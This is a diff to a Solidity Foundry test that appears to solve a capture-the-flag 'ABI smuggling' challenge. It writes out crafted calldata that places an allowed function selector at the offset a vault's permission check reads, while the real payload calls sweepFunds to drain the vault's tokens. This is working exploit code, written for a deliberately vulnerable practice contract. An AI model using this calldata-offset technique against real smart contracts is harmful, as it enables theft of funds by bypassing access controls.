@@ -73,7 +73,19 @@ contract ABISmugglingChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_abiSmuggling() public checkSolvedByPlayer {
-        
+        // https://docs.soliditylang.org/en/develop/abi-spec.html
+        bytes memory actionData = abi.encodeCall(SelfAuthorizedVault.sweepFunds, (recovery, IERC20(address(token))));
+        bytes memory data = abi.encodePacked(
+            vault.execute.selector,
+            uint256(uint160(address(vault))),
+            uint256(0x80), // Data starts 128 bytes after selector
+            "i can put whatever i want here!!", // Happens to be 32 bytes LOL
+            abi.encodePacked(hex"d9caed12", bytes28(0)), // Mangle to pass the permissions check
+            uint256(actionData.length), // Length of bytes value
+            actionData // Actual call to sweepFunds
+        );
+
+        address(vault).call(data);
     }
 
     /**
